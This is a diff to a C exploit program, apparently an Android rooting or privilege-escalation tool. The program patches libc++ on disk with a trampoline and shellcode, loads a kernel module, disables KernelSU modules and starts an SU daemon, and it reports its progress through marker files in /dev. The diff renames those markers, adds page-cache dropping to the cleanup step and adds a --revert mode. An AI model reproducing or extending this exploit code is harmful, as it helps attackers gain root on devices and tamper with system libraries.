@@ -382,14 +382,23 @@ static int patch_ko(void) {
 }
 
 static void cleanup(void) {
-    if (!g_libcxx_r.valid) return;
-    printf("\n=== cleanup ===\n");
-    printf("restoring trampoline in %s\n", g_libcxx_r.lib);
-    patch_file_cbc(g_libcxx_r.lib, (char *)g_libcxx_r.tramp_orig, 16,
-                   (size_t)g_libcxx_r.tramp_aligned, 0);
-    printf("restoring shellcode in %s\n", g_libcxx_r.lib);
-    patch_file_cbc(g_libcxx_r.lib, g_libcxx_r.shell_orig, g_libcxx_r.shell_padded,
-                   (size_t)g_libcxx_r.shell_off, 0);
+    if (g_libcxx_r.valid) {
+        printf("\n=== cleanup ===\n");
+        printf("restoring trampoline in %s\n", g_libcxx_r.lib);
+        patch_file_cbc(g_libcxx_r.lib, (char *)g_libcxx_r.tramp_orig, 16,
+                       (size_t)g_libcxx_r.tramp_aligned, 0);
+        printf("restoring shellcode in %s\n", g_libcxx_r.lib);
+        patch_file_cbc(g_libcxx_r.lib, g_libcxx_r.shell_orig, g_libcxx_r.shell_padded,
+                       (size_t)g_libcxx_r.shell_off, 0);
+    }
+
+    printf("clearing page cache...\n");
+    sync();
+    int drop_fd = open("/proc/sys/vm/drop_caches", O_WRONLY);
+    if (drop_fd >= 0) {
+        write(drop_fd, "3\n", 2);
+        close(drop_fd);
+    }
 }
 
 int find_hook_target(const char *lib, const char *sym,
@@ -559,19 +568,19 @@ static int exploit(void) {
         const char *msg;
         int         rc;
     } markers[] = {
-        { "/dev/df",    "libc++: loading custom module",                    -1 },
-        { "/dev/dfm0",  "kernel module: launching bootstrap",               -1 },
-        { "/dev/dfm1",  "bootstrap: loading app preferences file",          -1 },
-        { "/dev/dfme0", "bootstrap: ERROR - reading prefs failed",           1 },
-        { "/dev/dfm2",  "bootstrap: cloning zygote env",                    -1 },
-        { "/dev/dfmw0", "bootstrap: WARNING - clone zygote env failed",     -1 },
-        { "/dev/dfm3",  "bootstrap: setting partitions ro",                 -1 },
-        { "/dev/dfmw1", "bootstrap: WARNING - set partitions ro failed",    -1 },
-        { "/dev/dfm4",  "bootstrap: disabling ksu modules",                 -1 },
-        { "/dev/dfme1", "bootstrap: ERROR - disable modules failed",         1 },
-        { "/dev/dfm5",  "bootstrap: starting SU daemon",                    -1 },
-        { "/dev/dfm6",  "ksud start: SUCCESS",                               0 },
-        { "/dev/dfme2", "ksud start: ERROR - ksud nonzero exit",             1 },
+        { "/dev/tr",    "libc++: loading custom module",                    -1 },
+        { "/dev/trm0",  "kernel module: launching bootstrap",               -1 },
+        { "/dev/trm1",  "bootstrap: loading app preferences file",          -1 },
+        { "/dev/trme0", "bootstrap: ERROR - reading prefs failed",           1 },
+        { "/dev/trm2",  "bootstrap: cloning zygote env",                    -1 },
+        { "/dev/trmw0", "bootstrap: WARNING - clone zygote env failed",     -1 },
+        { "/dev/trm3",  "bootstrap: setting partitions ro",                 -1 },
+        { "/dev/trmw1", "bootstrap: WARNING - set partitions ro failed",    -1 },
+        { "/dev/trm4",  "bootstrap: disabling ksu modules",                 -1 },
+        { "/dev/trme1", "bootstrap: ERROR - disable modules failed",         1 },
+        { "/dev/trm5",  "bootstrap: starting SU daemon",                    -1 },
+        { "/dev/trm6",  "ksud start: SUCCESS",                               0 },
+        { "/dev/trme2", "ksud start: ERROR - ksud nonzero exit",             1 },
     };
     int seen[sizeof(markers)/sizeof(markers[0])] = {0};
 
@@ -591,8 +600,37 @@ done:
     return rc;
 }
 
+static int do_revert(void) {
+    printf("=== revert (unlinking markers & clearing page cache) ===\n");
+    unlink("/dev/tr");
+    unlink("/dev/trm0");
+    unlink("/dev/trm1");
+    unlink("/dev/trme0");
+    unlink("/dev/trm2");
+    unlink("/dev/trmw0");
+    unlink("/dev/trm3");
+    unlink("/dev/trmw1");
+    unlink("/dev/trm4");
+    unlink("/dev/trme1");
+    unlink("/dev/trm5");
+    unlink("/dev/trm6");
+    unlink("/dev/trme2");
+
+    sync();
+    int drop_fd = open("/proc/sys/vm/drop_caches", O_WRONLY);
+    if (drop_fd >= 0) {
+        write(drop_fd, "3\n", 2);
+        close(drop_fd);
+    }
+    printf("revert: page cache dropped\n");
+    return 0;
+}
+
 int main(int argc, char **argv) {
     setvbuf(stdout, NULL, _IONBF, 0);
+    if (argc > 1 && !strcmp(argv[1], "--revert")) {
+        return do_revert();
+    }
     if (setup(argc, argv) != 0) return 2;
     int rc = exploit();
     cleanup();
